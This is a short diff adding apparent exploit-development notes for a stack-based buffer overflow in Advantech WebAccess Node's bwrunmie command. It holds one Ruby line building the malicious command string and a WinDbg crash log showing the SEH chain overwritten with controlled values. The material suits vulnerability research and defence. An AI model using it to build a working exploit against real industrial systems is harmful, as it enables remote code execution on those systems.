@@ -1,0 +1,41 @@
+Advantech WebAccess Node bwrunmie Stack-based Buffer Overflow Remote Code Execution Vulnerability
+
+command << "bwrunmie 0 0 #{buff}"
+
+start    end        module name
+00400000 00409000   image00400000 C (no symbols)           
+10000000 1000b000   bwiedll  C (export symbols)       C:\WebAccess\Node\bwiedll.dll
+704a0000 7052a000   ODBC32     (pdb symbols)          C:\Windows\system32\ODBC32.dll
+73080000 7319c000   MFC42      (pdb symbols)          C:\Windows\system32\MFC42.DLL
+76000000 7604a000   KERNELBASE   (pdb symbols)          C:\Windows\system32\KERNELBASE.dll
+76080000 7612c000   msvcrt     (pdb symbols)          C:\Windows\system32\msvcrt.dll
+76190000 76231000   RPCRT4     (pdb symbols)          C:\Windows\system32\RPCRT4.dll
+76410000 764d9000   USER32     (pdb symbols)          C:\Windows\system32\USER32.dll
+766e0000 7677d000   USP10      (pdb symbols)          C:\Windows\system32\USP10.dll
+767d0000 7685f000   OLEAUT32   (pdb symbols)          C:\Windows\system32\OLEAUT32.dll
+76860000 768ae000   GDI32      (pdb symbols)          C:\Windows\system32\GDI32.dll
+77500000 775d4000   kernel32   (pdb symbols)          C:\Windows\system32\kernel32.dll
+778f0000 77990000   ADVAPI32   (pdb symbols)          C:\Windows\system32\ADVAPI32.dll
+77ad0000 77c2c000   ole32      (private pdb symbols)  C:\Windows\system32\ole32.dll
+77c30000 77d6c000   ntdll      (pdb symbols)          C:\Windows\SYSTEM32\ntdll.dll
+77e00000 77e0a000   LPK        (pdb symbols)          C:\Windows\system32\LPK.dll
+77e40000 77e59000   sechost    (pdb symbols)          C:\Windows\SYSTEM32\sechost.dll
+1:010> g
+ModLoad: 75c80000 75ccb000   C:\Windows\system32\apphelp.dll
+ModLoad: 77de0000 77dff000   C:\Windows\system32\IMM32.DLL
+ModLoad: 76240000 7630c000   C:\Windows\system32\MSCTF.dll
+ModLoad: 71260000 71298000   C:\Windows\system32\odbcint.dll
+ModLoad: 75cd0000 75cdc000   C:\Windows\system32\CRYPTBASE.dll
+ModLoad: 74b90000 74bd0000   C:\Windows\system32\uxtheme.dll
+(9ec.9f8): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=00000043 ebx=ffffffff ecx=ffffffff edx=00000008 esi=00130000 edi=0012f690
+eip=00401a05 esp=0012f4a8 ebp=0012f678 iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
+image00400000+0x1a05:
+00401a05 8806            mov     byte ptr [esi],al          ds:0023:00130000=41
+1:010> !exchain
+0012ff78: 41414141
+Invalid exception stack at 42424242
+
